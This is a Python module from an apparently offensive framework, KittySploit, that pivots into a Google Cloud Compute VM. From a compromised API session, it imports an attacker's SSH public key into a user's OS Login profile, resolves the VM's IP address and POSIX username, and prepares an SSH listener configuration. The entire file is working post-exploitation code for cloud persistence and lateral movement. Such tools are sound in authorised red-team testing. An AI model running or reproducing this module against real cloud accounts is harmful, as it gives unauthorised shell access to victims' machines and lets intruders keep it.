#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import time

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Compute SSH Pivot via OS Login",
        "description": "Pivot to a VM by importing an SSH key through OS Login and preparing a Compute SSH session",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "compute", "oslogin", "ssh", "pivot"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['configuration_change', 'active_exploitation', 'api_request'],
        'expected_requests': 3,
        'reversible': True,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    instance_name = OptString("", "Target Compute Engine instance name", True)
    zone = OptString("", "Instance zone", True)
    ssh_public_key = OptString("", "Attacker SSH public key to import through OS Login", True)
    private_key_file = OptString("", "Local private key file for the Compute SSH listener", False)
    user_email = OptString("", "OS Login Google identity; required when current principal is a service account", False)
    key_type = OptString("ssh-rsa", "Key type label stored by OS Login", False)
    use_iap = OptBool(False, "Suggest IAP tunneling for the Compute SSH listener", False)
    internal_ip = OptBool(False, "Resolve and use the instance internal IP", False)
    wait_seconds = OptInteger(5, "Seconds to wait after OS Login import before pivot", False)
    export_json = OptString("", "Optional pivot configuration JSON file", False)

    LISTENER_MODULE = "listeners/gcp/compute_ssh"

    def run(self):
        try:
            project_id = self._gcp_project_id()
            instance_name = str(self.instance_name or "").strip()
            zone = str(self.zone or "").strip()
            public_key = str(self.ssh_public_key or "").strip()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False
            if not public_key:
                print_error("ssh_public_key is required")
                return False

            user_email = self._resolve_user_email()
            if not user_email:
                print_error("Could not resolve OS Login user email")
                return False

            print_info(f"Importing SSH key through OS Login for {user_email}...")
            imported = self._gcp_import_oslogin_ssh_key(
                user_email,
                public_key,
                key_type=str(self.key_type or "ssh-rsa"),
            )
            if not imported.get("ok"):
                print_error(f"OS Login import failed: {imported.get('error', '')}")
                return False

            body = imported.get("body") or {}
            ssh_username = self._gcp_oslogin_posix_username(body)
            if not ssh_username:
                print_warning("Could not resolve POSIX username from OS Login profile; using email local-part")
                ssh_username = user_email.split("@", 1)[0]

            lookup = self._gcp_get_compute_instance(project_id, zone, instance_name)
            instance = lookup.get("instance") or {} if lookup.get("ok") else {}

            wait_s = max(0, int(self.wait_seconds or 0))
            if wait_s:
                print_info(f"Waiting {wait_s}s for OS Login propagation...")
                time.sleep(wait_s)

            target_host = self._gcp_instance_ip(instance, internal=bool(self.internal_ip))
            pivot = self._gcp_pivot_listener_config(
                self.LISTENER_MODULE,
                {
                    "project_id": project_id,
                    "zone": zone,
                    "instance_name": instance_name,
                    "ssh_username": ssh_username,
                    "private_key_file": str(self.private_key_file or "").strip(),
                    "target_host": target_host,
                    "use_iap": bool(self.use_iap),
                    "internal_ip": bool(self.internal_ip),
                },
            )

            print_success("OS Login SSH pivot prepared")
            print_info(f"OS Login user: {user_email}")
            print_info(f"POSIX username: {ssh_username}")
            print_info(f"Target VM: {instance_name} ({zone})")
            if target_host:
                print_info(f"Resolved host: {target_host}")
            print_info(f"Open listener: {self.LISTENER_MODULE}")

            output = {
                "project_id": project_id,
                "user_email": user_email,
                "ssh_username": ssh_username,
                "target_host": target_host,
                "login_profile": body,
                "pivot": pivot,
            }
            if self.export_json:
                exported = self._gcp_export_json(str(self.export_json or ""), output)
                if exported:
                    print_success(f"Pivot configuration exported to {exported}")

            return self.module_result(success=True, data=output)
        except Exception as exc:
            print_error(f"Compute SSH OS Login pivot failed: {exc}")
            return False

    def _resolve_user_email(self):
        configured = str(self.user_email or "").strip()
        if configured:
            return configured
        client_email = self._gcp_client_email()
        if not client_email:
            return ""
        if client_email.endswith(".gserviceaccount.com"):
            print_warning(
                "Current principal is a service account; set user_email to the OS Login "
                "Google identity (e.g. user@company.com)"
            )
            return ""
        return client_email
